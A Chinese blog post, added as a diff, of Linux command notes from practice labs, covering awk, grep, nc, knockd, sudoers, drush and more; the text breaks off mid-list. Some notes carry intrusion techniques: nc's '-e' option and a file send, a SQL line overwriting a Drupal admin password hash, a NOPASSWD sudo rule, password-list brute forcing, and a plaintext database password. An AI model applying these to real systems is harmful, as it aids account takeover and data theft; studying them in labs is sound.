@@ -1,0 +1,1415 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="靶场或者平时遇到的linux指令记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux指令笔记">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/49809.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="靶场或者平时遇到的linux指令记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-30T03:32:44.000Z">
+<meta property="article:modified_time" content="2025-02-18T03:52:45.201Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="操作系统">
+<meta property="article:tag" content="shell">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/49809.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>linux指令笔记 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/49809.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          linux指令笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-30 11:32:44" itemprop="dateCreated datePublished" datetime="2025-01-30T11:32:44+08:00">2025-01-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-18 11:52:45" itemprop="dateModified" datetime="2025-02-18T11:52:45+08:00">2025-02-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/679aeb70d0e0a243d4f89123.jpg" class="img-topic">
+        </div>
+      
+      
+        <p>靶场或者平时遇到的linux指令记录</p>
+<span id="more"></span>
+<h1 id="Linux-常用指令笔记"><a href="#Linux-常用指令笔记" class="headerlink" title="Linux 常用指令笔记"></a>Linux 常用指令笔记</h1><h2 id="awk-文本处理工具"><a href="#awk-文本处理工具" class="headerlink" title="&#x3D;&#x3D;awk&#x3D;&#x3D; 文本处理工具"></a>&#x3D;&#x3D;awk&#x3D;&#x3D; 文本处理工具</h2><p><strong>功能</strong>：逐行处理文本，自动分割字段（默认以空格&#x2F;Tab分隔）</p>
+<h3 id="核心变量"><a href="#核心变量" class="headerlink" title="核心变量"></a>核心变量</h3><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$0</code></td>
+<td>整行内容</td>
+</tr>
+<tr>
+<td><code>$1</code></td>
+<td>第一列</td>
+</tr>
+<tr>
+<td><code>$2</code></td>
+<td>第二列</td>
+</tr>
+<tr>
+<td><code>...</code></td>
+<td>…</td>
+</tr>
+<tr>
+<td><code>$NF</code></td>
+<td>最后一列</td>
+</tr>
+<tr>
+<td><code>$NR</code></td>
+<td>行数 （可以判断时候用 比如$NR %2 =&#x3D;0</td>
+</tr>
+</tbody></table>
+<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-F</code></td>
+<td>指定字段分隔符</td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>指定外部脚本文件</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td>传递外部变量到awk脚本</td>
+</tr>
+</tbody></table>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用逗号分隔符，打印第二列</span></span><br><span class="line"><span class="attribute">awk</span> -F <span class="string">&#x27;,&#x27;</span> <span class="string">&#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;</span> filename</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印最后一列和整行</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print <span class="variable">$NF</span>, <span class="variable">$0</span>&#125;&#x27;</span> file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 条件处理（打印第一列大于10的行）</span></span><br><span class="line">awk <span class="string">&#x27;<span class="variable">$1</span> &gt; 10 &#123;print <span class="variable">$0</span>&#125;&#x27;</span> data.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#提取每一行的最后一个字符 并且去掉换行</span></span><br><span class="line">cat a.txt | awk <span class="string">&#x27;&#123;print substr(<span class="variable">$0</span>,length(<span class="variable">$0</span>)-1,1)&#125;&#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="knockd-服务"><a href="#knockd-服务" class="headerlink" title="knockd 服务"></a>knockd 服务</h2><h3 id="配置文件：-etc-knockd-conf"><a href="#配置文件：-etc-knockd-conf" class="headerlink" title="配置文件：&#x2F;etc&#x2F;knockd.conf"></a>配置文件：&#x2F;etc&#x2F;knockd.conf</h3><h3 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h3><p>端口敲击服务，通过特定端口访问序列触发防火墙规则</p>
+<h3 id="应用示例"><a href="#应用示例" class="headerlink" title="应用示例"></a>应用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按顺序敲击端口 1111,2222,3333</span></span><br><span class="line"><span class="attribute">knock</span> -v <span class="number">192.168.1.10</span> <span class="number">1111</span> <span class="number">2222</span> <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试端口开放情况</span></span><br><span class="line"><span class="attribute">nmap</span> -p <span class="number">80</span> <span class="number">192.168.1.10</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="grep-文本搜索工具"><a href="#grep-文本搜索工具" class="headerlink" title="grep 文本搜索工具"></a>grep 文本搜索工具</h2><h3 id="元字符表"><a href="#元字符表" class="headerlink" title="元字符表"></a>元字符表</h3><table>
+<thead>
+<tr>
+<th>元字符</th>
+<th>功能</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>^</td>
+<td>行首定位符</td>
+<td>^start</td>
+</tr>
+<tr>
+<td>$</td>
+<td>行尾定位符</td>
+<td>end$</td>
+</tr>
+<tr>
+<td>.*</td>
+<td>任意字符（0 或多个）</td>
+<td>a.*b</td>
+</tr>
+<tr>
+<td>[]</td>
+<td>字符集合匹配</td>
+<td>[aeiou]</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>单词开头</td>
+<td>&lt;word</td>
+</tr>
+</tbody></table>
+<h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-E</td>
+<td>使用扩展正则表达式（等价于 <code>grep -E</code> &#x3D; <code>egrep</code>）</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>比较字符时忽略大小写</td>
+</tr>
+<tr>
+<td>-w</td>
+<td>只匹配完整的词，等价于正则中的 <code>\&lt;...\&gt;</code></td>
+</tr>
+<tr>
+<td>-x</td>
+<td>只匹配整行内容，等价于正则中的 <code>^...$</code></td>
+</tr>
+<tr>
+<td>-v</td>
+<td>取反，输出不符合模式的内容</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>统计匹配到的行数（行数而非匹配的次数）</td>
+</tr>
+<tr>
+<td>-m</td>
+<td>只匹配规定的行数，之后不再继续匹配</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>在输出结果中显示行号，指的是文件中原始的行号</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>只显示匹配的部分，而非整行内容</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>搜索所有文件，但不跟随符号链接</td>
+</tr>
+<tr>
+<td>-R</td>
+<td>递归搜索，适用于目录中的多个文件或目录</td>
+</tr>
+<tr>
+<td>-B</td>
+<td>输出匹配行之前的若干行，例如 <code>grep -B 3 &quot;aa&quot; file</code> 输出包含 “aa” 的行以及前 3 行</td>
+</tr>
+<tr>
+<td>-A</td>
+<td>输出匹配行之后的若干行</td>
+</tr>
+<tr>
+<td>-C</td>
+<td>同时显示匹配行的前后几行，等价于同时使用 <code>-B</code> 和 <code>-A</code></td>
+</tr>
+</tbody></table>
+<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -i <span class="string">&quot;hello&quot;</span> <span class="keyword">file</span>.txt # 忽略大小写查找</span><br><span class="line"><span class="keyword">grep</span> -n <span class="string">&quot;pattern&quot;</span> <span class="keyword">file</span>.txt # 查找文件 <span class="keyword">file</span>.txt 中包含 <span class="string">&quot;pattern&quot;</span> 的行，并显示行号</span><br><span class="line"><span class="keyword">grep</span> -r <span class="string">&quot;pattern&quot;</span> /path/<span class="keyword">to</span>/directory/  # 在 /path/<span class="keyword">to</span>/directory 目录下递归查找包含 <span class="string">&quot;pattern&quot;</span> 的文件</span><br><span class="line"><span class="keyword">grep</span> -<span class="keyword">o</span> <span class="string">&quot;pattern&quot;</span> <span class="keyword">file</span>.txt # 在文件 <span class="keyword">file</span>.txt 中查找 <span class="string">&quot;pattern&quot;</span> 并只显示匹配到的部分</span><br><span class="line"><span class="keyword">grep</span> -v <span class="string">&quot;error&quot;</span> <span class="built_in">log</span>.txt # 输出 <span class="built_in">log</span>.txt 中不包含 <span class="string">&quot;error&quot;</span> 的行</span><br><span class="line"><span class="keyword">grep</span> -A <span class="number">3</span> <span class="string">&quot;error&quot;</span> <span class="built_in">log</span>.txt # 在文件 <span class="built_in">log</span>.txt 中查找 <span class="string">&quot;error&quot;</span> 并显示该行以及之后的 <span class="number">3</span> 行</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<h2 id="nc-Netcat-网络工具"><a href="#nc-Netcat-网络工具" class="headerlink" title="nc (Netcat) 网络工具"></a>nc (Netcat) 网络工具</h2><h3 id="常用参数-2"><a href="#常用参数-2" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-l</td>
+<td>监听模式</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>显示详细信息</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>禁用 DNS 解析</td>
+</tr>
+<tr>
+<td>-p PORT</td>
+<td>指定本地端口</td>
+</tr>
+<tr>
+<td>-u</td>
+<td>UDP 模式</td>
+</tr>
+<tr>
+<td>-e CMD</td>
+<td>连接后执行命令</td>
+</tr>
+<tr>
+<td>-w TIME</td>
+<td>设置连接超时，单位为秒</td>
+</tr>
+<tr>
+<td>-z</td>
+<td>扫描模式，不发送数据，只进行端口扫描</td>
+</tr>
+</tbody></table>
+<h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听端口 4444</span></span><br><span class="line"><span class="attribute">nc</span> -lp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送文件</span></span><br><span class="line"><span class="attribute">nc</span> -w <span class="number">3</span> <span class="number">192.168.1.100</span> <span class="number">4444</span> &lt; file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># UDP端口扫描</span></span><br><span class="line"><span class="attribute">nc</span> -zuv <span class="number">192.168.1.1</span> <span class="number">1</span>-<span class="number">1000</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="sudo-权限管理"><a href="#sudo-权限管理" class="headerlink" title="sudo 权限管理"></a>sudo 权限管理</h2><p><strong>配置文件</strong>：&#x2F;etc&#x2F;sudoers</p>
+<h3 id="典型配置"><a href="#典型配置" class="headerlink" title="典型配置"></a>典型配置</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 允许用户免密码执行所有命令</span></span><br><span class="line">username <span class="literal">ALL</span>=(<span class="literal">ALL</span>) NOPASSWD: <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许组执行特定命令</span></span><br><span class="line">%<span class="literal">admin</span> <span class="literal">ALL</span>=/usr/bin/apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># root 用户可以在任何主机上、以任何用户身份以及任何组身份执行所有命令。</span></span><br><span class="line">root	<span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo 组的成员可以在任何主机上、以任何用户身份和任何组身份执行所有命令。</span></span><br><span class="line">%sudo	<span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="drush-Drupal-Shell"><a href="#drush-Drupal-Shell" class="headerlink" title="drush (Drupal Shell)"></a>drush (Drupal Shell)</h2><p>(Drush &#x3D; Drupal + Shell) 就是使用命令行命令来操作 Drupal 站点，它的命令格式与 git 类似，都是双字命令（drush + 实际的命令）。为了使用 Drush，必须先告诉 Drush 要操作哪个站点，<strong>一个最直接的方法是将当前目录转到要想操作的站点目录下，Drush 就自动将操作应用于当前目录下的站点</strong>。<br>常用指令：<br><strong>启用模块 &#x2F; 禁用模块</strong>  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drush en/dis project_name  </span><br><span class="line">drush pm-uninstall modulename <span class="comment">#先禁用再删除</span></span><br></pre></td></tr></table></figure></div>
+<p><strong>卸载模块</strong>  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush pmu <span class="keyword">module</span> -y</span><br></pre></td></tr></table></figure></div>
+<p><strong>数据库导出 （在导出之前 drush cc all）</strong>  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">drush <span class="keyword">sql</span>-dump &gt; DB.<span class="keyword">sql</span>  </span><br><span class="line">drush <span class="keyword">sql</span>-dump –gzip &gt; DB.tar.gz ### 导出数据库并压缩  </span><br><span class="line">mysqldump -p site &gt; db.<span class="keyword">sql</span>  </span><br><span class="line">drush <span class="keyword">sql</span>-dump &gt; db.<span class="keyword">sql</span> —gzip —result=/backups/example.<span class="keyword">sql</span>  </span><br><span class="line">mysqldump -h192<span class="number">.168</span><span class="number">.42</span><span class="number">.1</span> -uyuc -pQ5p94qAk47 –databases intg_hit &gt;hit.<span class="keyword">sql</span></span><br></pre></td></tr></table></figure></div>
+<p><strong>查看用户信息</strong>  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drush <span class="keyword">user</span><span class="operator">-</span>information biaoge,maike  </span><br><span class="line">给 maike 一个 <span class="keyword">member</span> 的角色  </span><br><span class="line">drush urol <span class="keyword">member</span> maike</span><br></pre></td></tr></table></figure></div>
+<p><strong>新建会员</strong>  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush ucrt zhangsan –<span class="attribute">password</span>=111111</span><br></pre></td></tr></table></figure></div>
+<p><strong>创建新用户</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-create 用户名 --mail<span class="operator">=</span><span class="string">&quot;邮箱&quot;</span> --password<span class="operator">=</span><span class="string">&quot;密码&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p><strong>修改密码</strong><br><code>php scripts/password-hash.sh &#39;yourpassword&#39;</code><br><code>drush upwd root --password=&quot;****&quot;</code><br><code>UPDATE users SET name=&#39;admin&#39;, pass=&#39;$S$DfQ/y58nGpZvyRLYd3LSyJ.s82xSC3Z.2oxdCIL4EHKAYcQnDl9T&#39; WHERE uid = 1**;</code><br><strong>drush -status</strong>   查看版本等信息</p>
+<h2 id="scp-安全文件传输"><a href="#scp-安全文件传输" class="headerlink" title="scp 安全文件传输"></a>scp 安全文件传输</h2><p><code>scp</code> 是一个基于 SSH 协议的文件传输工具，用于在本地与远程主机之间或两台远程主机之间安全地拷贝文件。<code>scp</code> 的全称是 <strong>Secure Copy</strong>，它的用法与 <code>cp</code> 类似，但支持远程文件传输</p>
+<h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载远程文件</span></span><br><span class="line">scp user<span class="variable">@remote</span><span class="symbol">:/path/file</span>.txt local_dir</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传目录（递归）</span></span><br><span class="line">scp -r local_dir user<span class="variable">@remote</span><span class="symbol">:/path/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">scp -P <span class="number">2222</span> file.txt user<span class="variable">@remote</span><span class="symbol">:/path/</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p><code>ps</code> 是 Linux 和 Unix 系统中用于查看当前系统中运行的进程状态的命令。它是 <strong>Process Status</strong> 的缩写，提供系统中活动进程的信息</p>
+<h3 id="常用参数-3"><a href="#常用参数-3" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-e</code></td>
+<td>显示所有进程。</td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>全格式显示进程信息（包含父进程等信息）。</td>
+</tr>
+<tr>
+<td><code>-u [user]</code></td>
+<td>显示某个用户的进程。</td>
+</tr>
+<tr>
+<td><code>-p [pid]</code></td>
+<td>显示特定进程的详细信息。</td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td>显示所有终端相关的进程（不包括会话首进程）。</td>
+</tr>
+<tr>
+<td><code>-x</code></td>
+<td>显示没有控制终端的进程（后台进程）。</td>
+</tr>
+<tr>
+<td><code>-l</code></td>
+<td>长格式显示进程信息。</td>
+</tr>
+<tr>
+<td><code>--forest</code></td>
+<td>显示进程的层级结构。</td>
+</tr>
+</tbody></table>
+<p>一般用-ef</p>
+<h2 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h2><p>访问文件的目录是&#x2F;var&#x2F;www&#x2F;html   访问记录在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
+<h2 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h2><p>cat指令反过来  让数据从最后一行开始颠倒  但是每行内容不变 适合题目给了一个passwords文件 从后面开始爆破</p>
+<h2 id="var-mail"><a href="#var-mail" class="headerlink" title="&#x2F;var&#x2F;mail"></a>&#x2F;var&#x2F;mail</h2><p>存放用户邮件的地方 里面可能有有用的信息</p>
+<h2 id="etc-release"><a href="#etc-release" class="headerlink" title="&#x2F;etc&#x2F;release"></a>&#x2F;etc&#x2F;release</h2><p>这个目录下有两个文件可以查看当前linux的版本信息</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>os-release: 包含全面的发行版信息，适用于大多数现代 Linux 发行版。</span><br><span class="line"><span class="regexp">/etc/i</span>ssue: 显示简短的版本信息，通常在登录时出现。</span><br><span class="line"><span class="regexp">/etc/</span>debian_version: 适用于基于 Debian 的系统，如 Ubuntu。</span><br><span class="line"><span class="regexp">/etc/</span>redhat-release: 适用于基于 RHEL 的系统，如 CentOS 和 Fedora。</span><br><span class="line"><span class="regexp">/etc/</span>centos-release: 适用于 CentOS 系统。</span><br><span class="line"><span class="regexp">/etc/</span>hostname: 